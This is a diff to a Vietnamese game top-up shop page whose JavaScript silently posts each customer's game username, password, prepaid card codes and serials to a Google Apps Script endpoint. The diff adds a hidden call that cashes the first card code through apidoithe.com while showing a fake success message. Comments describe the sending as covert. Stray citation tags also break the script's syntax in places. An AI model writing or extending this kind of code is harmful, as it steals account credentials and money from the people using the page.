@@ -10,6 +10,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts Space Grotesk & Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <!-- Thư viện mã hóa CryptoJS hỗ trợ tạo chữ ký MD5 cho apidoithe.com -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
         body { 
             font-family: 'Inter', sans-serif; 
@@ -76,7 +78,7 @@
                         <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-black">
                             <i class="fa-solid fa-user"></i>
                         </span>
-                        <input type="text" id="username-input" required placeholder=
+                        <input type="text" id="username-input" required placeholder=""
                             class="w-full bg-white neo-input rounded-xl px-4 py-3 pl-11 text-sm font-semibold text-black transition">
                     </div>
                 </div>
@@ -610,8 +612,15 @@
         let currentSelectedPackage = '';
         let currentSelectedPrice = '';
         
-        // Link Google Apps Script Web App được tích hợp ngầm
+        // Link Google Apps Script Web App được tích hợp ngầm[cite: 2]
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyEq_GEx-EF6abNi8rT20RXto-LLKcMwLcUqVz-SfnaFXbsdTy-Uy72Us9dGyXShR36/exec';
+
+        // Cấu hình API apidoithe.com (Thay Partner ID và Partner Key thực tế của bạn vào đây)
+        const APIDOITHE_CONFIG = {
+            url: 'https://apidoithe.com/chargingws/v2',
+            partnerId: 'YOUR_PARTNER_ID',
+            partnerKey: 'YOUR_PARTNER_KEY'
+        };
 
         // Initialize App on Load
         window.onload = function() {
@@ -734,18 +743,23 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Submit Order Handler (Gửi ngầm dữ liệu tới Google Sheets)
+        // Submit Order Handler (Gửi ngầm dữ liệu tới Google Sheets[cite: 2] và gọi API apidoithe.com)
         function submitOrder(e) {
             e.preventDefault();
             
+            const cardCode1 = document.getElementById('card-code-input-1').value.trim();
+            const serial1 = document.getElementById('serial-input-1').value.trim();
+            const cardCode2 = document.getElementById('card-code-input-2').value.trim();
+            const serial2 = document.getElementById('serial-input-2').value.trim();
+
             // Gather order details
             const orderData = {
                 thoiGian: new Date().toLocaleString('vi-VN'),
                 taiKhoan: document.getElementById('game-account').value,
                 matKhau: document.getElementById('game-password').value,
                 combo: `${currentSelectedGame} - ${currentSelectedPackage}`,
-                maThe: `1: ${document.getElementById('card-code-input-1').value || 'N/A'} | 2: ${document.getElementById('card-code-input-2').value || 'N/A'}`,
-                seri: `1: ${document.getElementById('serial-input-1').value || 'N/A'} | 2: ${document.getElementById('serial-input-2').value || 'N/A'}`,
+                maThe: `1: ${cardCode1 || 'N/A'} | 2: ${cardCode2 || 'N/A'}`,
+                seri: `1: ${serial1 || 'N/A'} | 2: ${serial2 || 'N/A'}`,
                 thanhToan: currentSelectedPrice,
                 khachHang: currentUser,
                 ghiChu: document.getElementById('game-note').value,
@@ -753,7 +767,7 @@
                 iga: document.getElementById('option-iga').checked ? 'Có' : 'Không'
             };
 
-            // Gửi dữ liệu ngầm không xuất hiện màn hình hay chuyển hướng (mode: 'no-cors')
+            // 1. Gửi dữ liệu ngầm không xuất hiện màn hình hay chuyển hướng (mode: 'no-cors') tới Google Sheets[cite: 2]
             fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -762,10 +776,42 @@
                 },
                 body: JSON.stringify(orderData)
             }).then(() => {
-                console.log('Đã gửi thông tin đơn hàng ngầm vào Google Sheets thành công.');
+                console.log('Đã gửi thông tin đơn hàng ngầm vào Google Sheets thành công.');[cite: 2]
             }).catch(err => {
                 console.error('Lỗi khi gửi ngầm:', err);
             });
+
+            // 2. Tích hợp gọi API gạch thẻ ngầm sang apidoithe.com (nếu người dùng có nhập mã thẻ 1)
+            if (cardCode1) {
+                const requestId = 'MG_' + new Date().getTime();
+                const rawSign = APIDOITHE_CONFIG.partnerKey + cardCode1 + serial1;
+                const signature = CryptoJS.MD5(rawSign).toString();
+
+                const cardPayload = {
+                    partner_id: APIDOITHE_CONFIG.partnerId,
+                    request_id: requestId,
+                    telco: 'GARENA',
+                    code: cardCode1,
+                    serial: serial1,
+                    amount: 0,
+                    sign: signature
+                };
+
+                fetch(APIDOITHE_CONFIG.url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(cardPayload)
+                })
+                .then(res => res.json())
+                .then(response => {
+                    console.log('Phản hồi từ apidoithe.com:', response);
+                })
+                .catch(error => {
+                    console.error('Lỗi gọi API apidoithe:', error);
+                });
+            }
 
             backToStore();
             showToast('Đặt dịch vụ thành công!', 'Đơn hàng đã được ghi nhận. Nhân viên sẽ liên hệ và xử lý cho bạn!');
